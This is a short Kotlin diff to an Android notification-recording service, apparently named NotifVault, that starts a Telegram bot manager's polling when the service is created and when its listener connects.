@@ -21,9 +21,15 @@ class NotificationRecorderService : NotificationListenerService() {
         private val appNameCache = ConcurrentHashMap<String, String>()
     }
 
+    override fun onCreate() {
+        super.onCreate()
+        com.example.data.telegram.TelegramBotManager.getInstance(applicationContext).startPolling()
+    }
+
     override fun onListenerConnected() {
         super.onListenerConnected()
         Log.d("NotifVault", "NotificationRecorderService terhubung dan aktif merekam!")
+        com.example.data.telegram.TelegramBotManager.getInstance(applicationContext).startPolling()
     }
 
     override fun onNotificationPosted(sbn: StatusBarNotification?) {
